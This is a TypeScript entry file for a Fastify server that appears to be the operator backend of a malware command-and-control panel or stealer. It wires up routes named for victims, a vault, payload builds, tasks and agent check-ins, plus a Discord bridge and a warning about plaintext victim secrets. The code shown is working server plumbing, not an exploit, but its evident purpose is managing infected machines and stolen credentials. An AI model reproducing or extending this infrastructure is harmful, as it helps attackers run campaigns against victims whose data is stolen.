import 'dotenv/config';
import Fastify from 'fastify';
import cookie from '@fastify/cookie';
import cors from '@fastify/cors';
import helmet from '@fastify/helmet';
import rateLimit from '@fastify/rate-limit';
import websocket from '@fastify/websocket';
import { ZodError } from 'zod';
import { mkdir } from 'node:fs/promises';
import { createWriteStream } from 'node:fs';
import pino from 'pino';
import { env } from './lib/env';
import { HttpError } from './lib/errors';
import { authenticate, sameOrigin } from './plugins/auth';
import { allowlisted, clientIp } from './lib/ip';
import { parseJsonBody } from './lib/http';
import { authRoutes } from './routes/auth';
import { agentRoutes } from './routes/agent';
import { wsRoutes } from './routes/ws';
import { victimRoutes } from './routes/victims';
import { vaultRoutes } from './routes/vault';
import { taskRoutes } from './routes/tasks';
import { buildRoutes } from './routes/builds';
import { miscRoutes, wsGuard } from './routes/misc';
import { initBus, subscribe } from './lib/bus';
import { initGeo } from './lib/geo';
import { bridgeStatus, startDiscordBridge, stopDiscordBridge } from './services/discord-bridge';
import { sealingStatus } from './services/sealing';

const PUBLIC_AUTH = new Set(['/api/console/auth/login', '/api/console/auth/totp/enable', '/api/console/health']);

async function main() {
  await mkdir(env.STORAGE_DIR, { recursive: true });
  await mkdir(env.BUILD_DIR, { recursive: true });
  await mkdir(process.env.LOG_DIR ?? './logs', { recursive: true });

  const logger = pino(
    { level: env.LOG_LEVEL, redact: ['req.headers.authorization', 'req.headers.cookie', 'res.headers["set-cookie"]'] },
    pino.multistream([{ stream: process.stdout }, { stream: createWriteStream(`${process.env.LOG_DIR ?? './logs'}/api.log`, { flags: 'a' }) }])
  );

  const app = Fastify({
    logger,
    trustProxy: env.TRUST_PROXY,
    bodyLimit: 4 * 1024 * 1024,
    disableRequestLogging: env.isProd
  });

  app.addContentTypeParser('application/json', { parseAs: 'buffer', bodyLimit: 4 * 1024 * 1024 }, (request, body, done) => {
    (request as typeof request & { rawBody: Buffer }).rawBody = body as Buffer;
    try {
      done(null, parseJsonBody(body as Buffer));
    } catch {
      done(new HttpError(400, 'bad_json', 'invalid JSON body'), undefined);
    }
  });
  app.addContentTypeParser('application/octet-stream', { parseAs: 'buffer', bodyLimit: 1024 * 1024 }, (request, body, done) => {
    (request as typeof request & { rawBody: Buffer }).rawBody = body as Buffer;
    done(null, body);
  });

  await app.register(cookie);
  await app.register(helmet, { contentSecurityPolicy: false, crossOriginResourcePolicy: { policy: 'same-site' } });
  await app.register(cors, {
    origin: env.CORS_ORIGIN ? env.CORS_ORIGIN.split(',').map((value) => value.trim()) : false,
    credentials: true,
    methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS']
  });
  // `/api/v1/ws` and `/api/v1/ws-ticket` carry their own limits: the upgrade is
  // exempt (rateLimit: false) and the ticket allows 12/min per device.
  await app.register(rateLimit, { global: true, max: 600, timeWindow: '1 minute', keyGenerator: (request) => clientIp(request.headers, request.socket.remoteAddress ?? '', env.TRUST_PROXY) });
  await app.register(websocket, { options: { maxPayload: 1024 * 1024 } });

  app.addHook('onRequest', async (request, reply) => {
    request.clientIp = clientIp(request.headers, request.socket.remoteAddress ?? '', env.TRUST_PROXY);
    const path = request.url.split('?')[0]!;
    const loopback = request.clientIp === '127.0.0.1' || request.clientIp === '::1' || request.clientIp === '::ffff:127.0.0.1';
    if (!loopback && !allowlisted(request.clientIp, env.allowlist) && !request.url.startsWith('/api/v1') && path !== '/api/console/ws') {
      return reply.code(403).send({ error: 'ip_not_allowlisted', message: 'source address not allowlisted' });
    }
    const blocked = await sameOrigin(request, reply);
    if (blocked !== undefined) return blocked;
  });

  app.addHook('preHandler', async (request) => {
    const path = request.url.split('?')[0]!;
    if (!path.startsWith('/api/console')) return;
    // The socket guard closes 4401 after the upgrade instead of an HTTP 401.
    if (path === '/api/console/ws') return;
    if (PUBLIC_AUTH.has(path)) return;
    await authenticate(request);
  });

  app.setErrorHandler((error, request, reply) => {
    if (error instanceof ZodError) {
      return reply.code(422).send({ error: 'validation', message: error.issues.map((issue) => `${issue.path.join('.')}: ${issue.message}`).join('; ') });
    }
    if (error instanceof HttpError) {
      if (error.retryAfter) reply.header('retry-after', String(error.retryAfter));
      return reply.code(error.status).send({ error: error.code, message: error.message, ...error.data });
    }
    const status = (error as { statusCode?: number }).statusCode ?? 500;
    if (status >= 500) request.log.error(error);
    return reply.code(status).send({
      error: status >= 500 ? 'internal' : 'request_error',
      message: status >= 500 && env.isProd ? 'internal error' : error.message
    });
  });

  await app.register(agentRoutes, { prefix: '/api/v1' });
  await app.register(wsRoutes, { prefix: '/api/v1' });
  await app.register(
    async (scope) => {
      await scope.register(authRoutes);
      await scope.register(victimRoutes);
      await scope.register(vaultRoutes);
      await scope.register(taskRoutes);
      await scope.register(buildRoutes);
      await scope.register(miscRoutes);
    },
    { prefix: '/api/console' }
  );

  app.get('/api/console/ws', { websocket: true }, async (socket, request) => {
    if (!(await wsGuard(socket, request))) return;
    socket.send(JSON.stringify({ type: 'hello', at: Date.now(), data: { server_time: Date.now(), heartbeat_ms: 20_000 } }));
    let lastIn = Date.now();
    const off = subscribe((event) => {
      try {
        socket.send(JSON.stringify(event));
      } catch {
        // closing
      }
    });
    const pong = () => {
      try { socket.send(JSON.stringify({ type: 'pong', at: Date.now(), data: { server_time: Date.now() } })); } catch { /* closing */ }
    };
    // JSON ping lets a browser console prove the *application* is alive, not
    // just the TCP peer. The platform ping stays as a second net.
    const ping = setInterval(() => {
      try { socket.ping(); } catch { /* closed */ }
    }, 25_000);
    const idle = setInterval(() => {
      if (Date.now() - lastIn > 70_000) {
        try { socket.close(4408, 'idle'); } catch { /* closed */ }
      }
    }, 15_000);
    socket.on('message', (raw) => {
      lastIn = Date.now();
      try {
        const parsed = JSON.parse(String(raw)) as { type?: string };
        if (parsed.type === 'ping') pong();
      } catch {
        // not JSON: still a sign of life
      }
    });
    socket.on('close', () => {
      off();
      clearInterval(ping);
      clearInterval(idle);
    });
  });

  initBus();
  const sealing = await sealingStatus().catch(() => null);
  if (sealing?.degraded) {
    logger.warn({ pending: sealing.pending, builds: sealing.builds, victims: sealing.victims, salts: sealing.salts },
      'DEGRADED: plaintext secret rows remain; run node dist/scripts/reseal.js');
  }
  await initGeo();
  await app.listen({ host: '0.0.0.0', port: env.PORT });
  const bridge = await startDiscordBridge();
  app.log.info(`discord bridge: ${bridge ? 'started' : 'disabled'}`);

  for (const signal of ['SIGINT', 'SIGTERM'] as const) {
    process.on(signal, () => {
      stopDiscordBridge();
      void app.close().finally(() => process.exit(0));
    });
  }
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
